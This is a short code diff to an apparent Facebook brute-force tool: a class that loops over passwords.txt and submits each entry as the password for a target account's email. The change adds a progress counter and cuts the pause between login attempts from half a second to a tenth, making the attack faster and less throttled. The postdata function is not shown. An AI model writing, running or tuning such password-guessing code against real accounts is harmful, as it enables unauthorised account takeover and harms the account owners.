@@ -92,12 +92,14 @@ class Facebook:
         # using txt file
         if(self.typeExec == 'auto'):
             file = open('passwords.txt', 'r')
+            fileb = open('passwords.txt', 'rb')
+            sumfile = len(list(fileb))
             i = 0
             for data in file:
                 i += 1
-                print(logtime(), "({i})_{password}".format(i = str(i), password = hash(data.replace('\n', ''))), end="-> ")
+                print(logtime(), "({i}/{sumfile})".format(i = str(i), sumfile=sumfile), end="-> ")
                 postdata(self.account['email'], data)
-                time.sleep(0.500)
+                time.sleep(0.1)
         # using password
         if(self.typeExec == 'manual'):
             email = self.account['email']
